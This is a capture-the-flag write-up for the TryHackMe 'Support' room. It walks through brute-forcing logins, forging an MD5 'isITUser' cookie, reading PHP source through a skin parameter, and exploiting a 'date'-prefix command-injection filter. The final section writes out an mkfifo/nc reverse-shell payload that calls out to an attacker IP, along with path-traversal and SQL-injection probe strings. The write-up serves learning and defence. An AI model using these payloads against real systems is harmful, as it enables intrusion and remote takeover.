# Write-Up: Support

**Platform:** TryHackMe  
**Room:** [Support](https://tryhackme.com/room/support)  
**Difficulty:** Medium  
**Date:** 2026-06-07  
**Topics:** Broken Authentication, Cookie Manipulation, Source Code Disclosure, Command Injection  

---

## Recon

Starting with a full port scan:

```bash
nmap -sC -sV -p- 10.114.168.23
```

Two open ports: SSH (22, OpenSSH 9.6p1) and HTTP (80, Apache 2.4.58 on Ubuntu). The nmap output also notes that the PHPSESSID cookie has no HttpOnly flag set.

The web application is a "Support Operations Panel" with an email/password login form. The placeholder in the email field reads `help@support.thm`, and the contact line at the bottom of the page says "Contact IT Operations @ help@support.thm".

Directory enumeration:

```bash
gobuster dir -u http://10.114.168.23 \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -x .php,.txt
```

Results:
- `info.php` — HTTP 200, 73 KB → a phpinfo() page, publicly accessible
- `config.php` — HTTP 200, 0 bytes → PHP file that produces no output
- `api.php` — HTTP 302 → redirects to `index.php` (auth required)
- `dashboard.php` — HTTP 302 → redirects to `index.php` (auth required)
- `skins/` — directory listing enabled
- `includes/` — directory listing enabled (`header.php`, `skin.php` — both empty)
- `layout/`, `js/` — only Bootstrap assets

The phpinfo() page at `info.php` provides useful intelligence: the webroot is `/var/www/html`, sessions are stored at `/var/lib/php/sessions/`, `session.cookie_httponly` is off, and `session.use_strict_mode` is off. The environment section shows `USER=root`, suggesting Apache was started as root.

---

## Enumeration — Login Form

The login form at `index.php` takes an email and password. Testing whether it distinguishes between an unknown email and a wrong password:

```bash
curl -s -X POST http://10.114.168.23/ \
  --data-urlencode "email=doesnotexist@support.thm" \
  --data-urlencode "password=test"
# → "Invalid credentials"

curl -s -X POST http://10.114.168.23/ \
  --data-urlencode "email=help@support.thm" \
  --data-urlencode "password=test"
# → "Invalid credentials"
```

Both responses are identical in content and size. No timing difference either. Direct username enumeration via the login endpoint is not possible.

The browser enforces email format validation on the input field, but this is client-side only and has no effect on curl requests.

---

## Initial Access — Brute-Forcing `help@support.thm`

The email address `help@support.thm` appears twice in the page source as a hint. Brute-forcing it against a common password list:

```bash
ffuf -w /usr/share/wordlists/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-10000.txt \
  -X POST \
  -d "email=help@support.thm&password=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -u http://10.114.168.23/ \
  -fc 200
```

Hit: **`help@support.thm` / `<REDACTED>`**

---

## Post-Login Enumeration

After logging in, two cookies are set:

```
PHPSESSID=<session_id>
isITUser=<MD5_OF_FALSE>
```

The `isITUser` value looks like an MD5 hash. Looking it up on crackstation.net confirms it is the MD5 hash of the string `"false"`.

The dashboard itself shows little: a "Ticket management system" card and a theme selector in the footer with options for default, red, green, and blue. The URL for theme selection is `?skin=default`, `?skin=red`, etc. The `skins/` directory was already enumerated and contains PHP files of 56 bytes each — likely just CSS variable definitions, which turned out to be correct (`<style>body { background-color: #e5f0ff; }</style>`).

### Attempt: Cookie Manipulation for Admin Access

The `isITUser` cookie encodes a boolean as an MD5 hash. Replacing `MD5("false")` with `MD5("true")` seems worth trying:

```bash
echo -n "true" | md5sum
# <MD5_OF_TRUE>
```

Sending the modified cookie to the dashboard reveals an additional card: **IT Admin Panel** with a "View API" button linking to `api.php`. The server trusts the client-supplied cookie value without any server-side verification.

### Exploring the API

The API page shows: "As a helpdesk user, you can query your own profile: `/user/3`" and displays the result of `GET /user/3`. Navigating directly to `http://10.114.168.23/user/3` returns JSON:

```json
{"email": "help@support.thm", "2FA": false, "admin": false}
```

Trying adjacent IDs manually:

```
/user/1 → {"email": "specialadmin@support.thm", "2FA": false, "admin": true}
/user/2 → {"email": "IT@support.thm", "2FA": false, "admin": false}
/user/3 → {"email": "help@support.thm", "2FA": false, "admin": false}
```

Three users total. `specialadmin@support.thm` has `admin: true`. To confirm no further users exist, an automated check over 100 IDs finds only these three.

The API also accepts PUT and PATCH requests, but the response always returns the unchanged user data — the request body is ignored.

---

## Attempting to Escalate to `specialadmin`

### Cookie Manipulation for `isAdmin`

By analogy with `isITUser`, several cookie names were tried with `MD5("true")` as the value: `isAdmin`, `isITAdmin`, `isadmin`, `isAdmin`. Also tried with Base64-encoded `"true"` (`dHJ1ZQ==`). None produced any change in application behavior.

### SQL Injection on the Login Form

Attempted classic auth bypass payloads via curl (bypassing the browser's email format validation):

```bash
curl -s -X POST http://10.114.168.23/ \
  --data-urlencode "email=' OR 1=1-- -" \
  --data-urlencode "password=x"
# → "Invalid credentials"
```

Also tried `admin'--`, `admin'#`, and various other payloads. Running sqlmap at level 3, risk 2 also found no injectable parameters.

### Brute-Forcing `specialadmin@support.thm`

Tried xato-net top 10,000 passwords and the top portion of rockyou.txt (~35,000 entries). No hit. At ~93 hours estimated time for the full rockyou list, this approach was abandoned.

### Brute-Forcing `IT@support.thm`

Tried xato-net top 10,000. No hit.

### LFI via `?skin=`

Attempted path traversal on the skin parameter:

```bash
?skin=../../etc/passwd
?skin=php://filter/convert.base64-encode/resource=config
?skin=../config%00
```

All returned a normal dashboard page with no file content. The parameter appeared to be whitelisted or filtered.

---

## Source Code Disclosure

At this point, trying `?skin=../dashboard` — including the dashboard PHP file itself — produces something unexpected: the page renders twice, and in the first pass, the raw PHP source of `dashboard.php` is visible in the HTML.

The skin loading code uses `readfile()`, not `include()`. This means PHP files are served as raw text rather than being executed. The `realpath()` check prevents traversal outside `/var/www/html`, but any PHP file within the webroot can be read as source code.

Reading `dashboard.php` reveals the skin loading logic and — crucially — that a card reading "Administrator Access Confirmed" is conditionally rendered based on `$_SESSION['admin']`. This session variable is set server-side at login. It also shows that the flag is read from `/var/www/web.txt`.

Reading `config.php`:

```bash
curl -s "http://10.114.168.23/dashboard.php?skin=../config" \
  -H "Cookie: PHPSESSID=...; isITUser=<MD5_OF_TRUE>"
```

```php
$MASTER_PASSWORD = '<REDACTED>';
$SITE_VER = '1.0';
$SITE_NAME = 'support_portal';
```

Reading `footer.php` reveals a command execution feature:

```php
$isAdmin = $_SESSION['admin'];
if ($isAdmin && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['sys'])) {
    $sys = $_POST['sys'];
    if (strpos($sys, 'date') === 0) {
        $output = shell_exec($sys);
    }
}
```

If `$_SESSION['admin']` is true, the application passes a POST parameter `sys` directly to `shell_exec()`. The only filter checks whether the value **starts with** `"date"` — anything after a semicolon will execute as a separate shell command.

Reading `api.php` source reveals: `$id = $_GET['id'] ?? $_SESSION['user_id']`. The `/user/` route calls `unset($user['password'])` before outputting JSON, but accessing `api.php?id=1` does not hit that branch. However, the template still does not render the password field in the HTML response.

Reading `index.php` source shows that credentials are stored in `/var/www/db.php` and compared in plaintext. Unfortunately `db.php` sits at `/var/www/db.php` — one level above the webroot — so `realpath()` blocks it from being read via the skin parameter.

---

## Cracking `specialadmin` — Password Variation

The MASTER_PASSWORD from `config.php` does not work directly for any user. However, it suggests a naming convention. Generating variations based on that pattern:

```bash
cat > passwords.txt << 'EOF'
<REDACTED_BASE>
<REDACTED_VARIANT_1>
<REDACTED_VARIANT_2>
...
EOF

ffuf -w passwords.txt \
  -X POST \
  -d "email=specialadmin@support.thm&password=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -u http://10.114.168.23/ \
  -fc 200
```

Hit: **`specialadmin@support.thm` / `<REDACTED>`**

Logging in as `specialadmin` and visiting the dashboard displays the Administrator Access Confirmed banner.

**Flag 1: (Redacted)

---

## Remote Code Execution — Command Injection

With a valid `specialadmin` session, the command injection in `footer.php` is active. The `strpos($sys, 'date') === 0` filter is bypassed by prepending `date;`:

```bash
curl -s -X POST 'http://10.114.168.23/dashboard.php' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -b 'PHPSESSID=<specialadmin_session>; isITUser=<MD5_OF_TRUE>' \
  -d 'sys=date%3Bid'
# uid=33(www-data) gid=33(www-data)
```

Establishing a reverse shell. The `bash -i >& /dev/tcp/...` payload did not connect, but a curl request to the attacker machine confirmed outbound connections work. Using a named pipe instead:

```bash
# Listener
nc -lvnp 4444

# Payload
curl -s -X POST 'http://10.114.168.23/dashboard.php' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -b 'PHPSESSID=<specialadmin_session>; isITUser=<MD5_OF_TRUE>' \
  --data-urlencode 'sys=date;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.135.195 4444 >/tmp/f'
```

Shell received as `www-data`. The flag is at `/home/ubuntu/user.txt`:

```bash
cat /home/ubuntu/user.txt
```

**Flag 2: (Redacted)

---

## Key Takeaways

- **phpinfo() exposed** — reveals webroot, session paths, and environment variables. Should never be accessible in production.
- **MD5 cookies without signatures** are trivially manipulated. Client-side values must never be trusted for access control decisions.
- **IDOR on the user API** — no authorization check on `/user/{id}`, exposing all accounts to any authenticated user.
- **readfile() leaks PHP source** — serving files with `readfile()` instead of `include()` bypasses PHP execution but exposes source code. Path traversal within the webroot was sufficient.
- **strpos() is not a security control** — checking that input starts with a known value does not prevent injection of arbitrary commands after a separator.
- **Password variation pays off** — when a known string (e.g. from a config file) doesn't work directly, systematic variations can crack accounts that evade standard wordlists.
- **mkfifo reverse shell** is more reliable than `bash -i >&` when the target shell lacks job control.
